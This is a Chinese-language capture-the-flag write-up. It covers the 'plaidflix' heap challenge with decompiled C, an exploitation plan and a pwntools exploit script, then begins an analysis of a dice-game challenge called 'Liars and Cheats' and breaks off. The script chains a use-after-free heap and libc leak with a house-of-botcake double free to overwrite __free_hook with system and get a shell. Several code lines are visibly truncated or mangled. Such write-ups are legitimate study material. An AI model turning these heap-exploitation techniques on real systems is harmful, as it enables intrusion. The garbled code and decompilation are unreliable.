                printf(format);
                read_str(*(_QWORD *)friend_array[i], size);
                break;
            }
        }
        if ( i > 7 )
            puts("That's too many friends!\n");
    }
非常正常的`malloc`操作，没有任何问题。  
但是再`manage_movie`这里有一个`share`功能：
    int share()
    {
        struct movie *v0; // rax
        int v2; // [rsp+8h] [rbp-8h]
        int v3; // [rsp+Ch] [rbp-4h]
        puts("Which great movie do you want to share?");
        printf(format);
        v2 = read_int();
        puts("Sharing is caring. Who's the lucky one?");
        printf(format);
        v3 = read_int();
        if ( v3 >= 0 && v3 = 0 && v2 shared = 1;
                    v0 = movie_array[v2];
                    v0->shared_friend = *(_QWORD *)friend_array[v3];
                }
            }
        }
        else
        {
            LODWORD(v0) = puts("Nope!");
        }
        return (int)v0;
    }
就是把一个`friend`指针存放到`movie`结构体里，而在`delete_friend`的时候：
    void *delete_friend()
    {
        void *result; // rax
        __int64 v1; // [rsp+8h] [rbp-8h]
        puts("Who made you angry that you don't want to be friends with them anymore?");
        printf(format);
        result = (void *)(int)read_int();
        v1 = (int)result;
        if ( (int)result >= 0LL && (int)result title, movie_array[i]->stars);
                LODWORD(v0) = movie_array[i]->shared;
                if ( (_DWORD)v0 )
                    LODWORD(v0) = printf("* Shared with: %s", (const char *)movie_array[i]->shared_friend);// leak
                ++v2;
            }
        }
        if ( !v2 )
            LODWORD(v0) = puts("You do not have any movies registered!");
        return (int)v0;
    }
它会将结构体里存的`friend`的内容打印出来。  
此外，利用的漏洞在于`delete_acount`这里，这里`delete_feedback`：
    int delete_feedback()
    {
        _DWORD *v0; // rax
        __int64 v2; // [rsp+8h] [rbp-8h]
        puts("\nWhat feedback do you want to delete?");
        printf(format);
        v2 = (int)read_int();
        if ( v2 >= 0 && v2 = 0 && v2  9 )
            puts("\nSo much feedback! That's too much work!\n");
    }
注意到这里是固定地`malloc(0x100uLL);`，没法分配任意大小。
此外，还提供了`add_detail`功能：
    int add_detail()
    {
        int result; // eax
        void *v1; // [rsp+8h] [rbp-8h]
        if ( entered )
            return puts("\nYou have already entered your contact informaion!");
        v1 = malloc(0x120uLL);
        puts("\nHow can we reach you in case of questions?");
        printf(format);
        result = (unsigned int)read_str((__int64)v1, 0x120uLL);
        entered = 1;
        return result;
    }
这里有一次`malloc(0x120uLL);`的机会，后续利用会用到。
###  利用思路
  1. 首先利用上面提到的`add_friend`，`share`，`delete_friend`，`show_movie`将`chunk->fd`给leak出来，配合一下glibc 2.32中`chunk->fd = (chunk >> 12) ^ next_chunk`，如果tcache里只有一个chunk，那么`chunk->fd`就是`chunk >> 12`，从而可以leak出heap地址。
  2. 再利用上面同样的方法，leak出`unsorted bin->fd`，从而拿到libc地址。
  3. 最后利用`delete_count`中的double free，由于早在glibc 2.29中就有对tcache double free的检测了，所以这里通过house of botcake的利用方法，将某一个victim chunk首先合并到unsorted bin中去，再free到tcache中去；之后利用`add_detail`从unsorted bin中割出0x130的chunk，从而可以写到该victim chunk的`fd = __free_hook ^ (chunk >> 12)`，分配到`__free_hook`写为`system`即可。
###  exp
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import *
    import sys, os, re
    context(arch='amd64', os='linux', log_level='debug')
    _proc = os.path.abspath('./plaidflix')
    _libc = os.path.abspath('./libc-2.32.so')
    libc = ELF(_libc)
    elf = ELF(_proc)
    p = remote('plaidflix.pwni.ng', 1337)
    # menu
    choose_items = {
        "add": 0,
        "delete": 1,
        "show": 2,
        "share": 3
    }
    def leave_name(name):
        p.sendlineafter("What is your name?\n> ", name)
    def choose(idx):
        p.sendlineafter("> ", str(idx))
    def add_movie(title, stars):
        choose(0)
        choose(choose_items['add'])
        p.sendlineafter("\nWhat movie title do you want to add?", title)
        p.sendlineafter("\nHow good is this movie (1-5 stars)?", str(stars))
    def add_friend(size, name):
        choose(1)
        choose(choose_items['add'])
        p.sendlineafter("How long is your friend's name?", str(size))
        p.sendlineafter("What's your friend's name?", name)
    def leave():
        choose(2)
        p.sendlineafter("\nAre you sure you want to delete you account? (y/N)", "y")
    def add_feedback(content):
        choose(choose_items['add'])
        p.sendlineafter("\nWhat feedback do you have for us?", content)
    def add_detail(content):
        choose(choose_items['show'])
        p.sendlineafter("\nHow can we reach you in case of questions?", content)
    def show_movie(title):
        choose(0)
        choose(choose_items['show'])
        p.recvuntil("Title: " + title)
        p.recvuntil("* Shared with: ")
    def show_friend(idx):
        choose(1)
        choose(choose_items['show'])
    def delete_movie(idx):
        choose(0)
        choose(choose_items['delete'])
        p.sendlineafter("\nWhat movie do you want to remove?\nI bet it's one you've seen a hundred times already.", str(idx))
    def delete_friend(idx):
        choose(1)
        choose(choose_items['delete'])
        p.sendlineafter("Who made you angry that you don't want to be friends with them anymore?", str(idx))
    def delete_feedback(idx):
        choose(choose_items['delete'])
        p.sendlineafter("\nWhat feedback do you want to delete?", str(idx))
    def share_movie(movie_idx, friend_idx):
        choose(0)
        choose(choose_items['share'])
        p.sendlineafter("Which great movie do you want to share?", str(movie_idx))
        p.sendlineafter("Sharing is caring. Who's the lucky one?", str(friend_idx))
    leave_name("N0p")
    # leak heap
    for i in range(8):
        add_friend(0x87, str(i))
    add_movie("AAA", 5)
    add_movie("BBB", 5)
    share_movie(0, 0)
    share_movie(1, 7)
    delete_friend(0)
    show_movie("AAA")
    heap_base = u64(p.recv(5).ljust(8, b"\x00")) > 12)))
    add_feedback("/bin/sh\x00") # chunk 1
    add_feedback(p64(libc_base + libc.sym['system']))
    delete_feedback(1)
    success("libc_base: " + hex(libc_base))
    success("heap_base: " + hex(heap_base))
    p.interactive()
## Liars and Cheats
###  题目分析
首先这题主要是玩一个骰子游戏，赢了之后直接给一个栈溢出的机会做ROP；所以重点在leak和怎么赢游戏上。  
分析一下整个游戏的规则和流程：
  1. 首先分配一块内存，用于存放骰子6个点数分别对应的个数，后面AI做决策的时候会用到： 
         dice_count = malloc(0x18uLL);
     if ( !dice_count )
         return 0xFFFFFFFFLL;
     v4 = step_into_game((__int64)dice_count);
  2. 再由用户决定玩游戏的人个数： 
         // ...
     players = read_int("How many players total (4-10)? ");
     if ( players  10 )
       return 0xFFFFFFFFLL;
     self = players - 1;
     ptr = malloc(4LL * players);
     // ...
人数在4 ~ 10之间，并分配相应的内存，用来后面储存每个player所剩骰子的个数。
  3. 之后打印游戏规则，简单来说就是： 
    * 玩家轮流猜骰子，方式是报出骰子的点数`x`，以及该点数骰子的个数`y`。
    * 除了第一个玩家必须`bet`之外，其他玩家都有三种选择，即假设上一名玩家报出点数`x`，以及个数`y`： 
      * `bet`：在上一个玩家的基础上，报出的骰子点数`x1`不比`x`小，报出对应点数的骰子个数`y1`也不比`y`小，即`x1 > x && y1 >= y || x1 >= x && y1 > y`。
      * `liar`：指出上一名玩家说谎，即认为当前所有玩家的骰子中点数为`x`的骰子个数比`y`小。如果判定正确，那么上一名玩家失去一个骰子；如果判定错误，那么当前玩家自己失去一个骰子。
      * `spot on`：认为当前所有玩家的骰子中点数为`x`的骰子个数比正好等于`y`。如果判定正确，那么当前玩家额外获得一个骰子；如果判定错误，那么当前玩家自己失去一个骰子。
    * 不断执行上述流程，最后如果所有AI玩家剩下的骰子为0，那么用户玩家胜出；如果用户玩家失去了所有骰子，那么用户玩家失败。
  4. 问题在于，AI玩家会提前知晓所有骰子点数对应的个数： 
         init_empty(dice_val_cnt);
     for ( present_player = 0; present_player < players; ++present_player )
     {
         for ( die_idx = 0; die_idx < dice_left[present_player]; ++die_idx )
         {
             val = rand() % 6;
             player[present_player].dices[die_idx] = val;
             increase_by_one(val, dice_val_cnt); // dice_val_cnt[val]++;
         }
         while ( die_idx <= 4 )
             player[present_player].dices[die_idx++] = -1;
     }
在轮到AI做决定的时候，会有如下判断逻辑：
         __int64 __fastcall do_judge(_DWORD *dice_val_cnt, int last_idx, unsigned int *dice_face, unsigned int *dice_cnt)
     {
         if ( last_idx != self ) // if last player is not user
             goto LABEL_11;
         if ( judge_less(dice_val_cnt, *dice_face, *dice_cnt) ) // dice_val_cnt[dice_face] < dice_cnt
             return 1LL; # liar
         if ( judge_eq(dice_val_cnt, *dice_face, *dice_cnt) ) // dice_val_cnt[dice_face] == dice_cnt
             return 2LL; # spot on
         LABEL_11:
         if ( (unsigned int)ai_judge(dice_val_cnt, (int *)dice_face, (int *)dice_cnt) )
             return 2LL; # spot on
         return 0LL; # continue
     }
     __int64 __fastcall ai_judge(_DWORD *dice_val_cnt, int *dice_face, int *dice_cnt)
     {
         __int64 result; // rax
         int i; // [rsp+24h] [rbp-Ch]
         int val; // [rsp+28h] [rbp-8h]
         int v7; // [rsp+2Ch] [rbp-4h]
         int cnt; // [rsp+2Ch] [rbp-4h]
         val = *dice_face;
         v7 = *dice_cnt + 1;
         if ( judge_less(dice_val_cnt, *dice_face, v7) )// dice_val_cnt[dice_face] < v7
         {
             cnt = v7 - 1;
             for ( i = val + 1; i <= 5 && judge_less(dice_val_cnt, i, cnt); ++i )
             ;
             if ( i <= 5 )
             {
                 *dice_face = i;
                 *dice_cnt = cnt;
                 result = 0LL;
             }
             else
             {
                 result = 0xFFFFFFFFLL;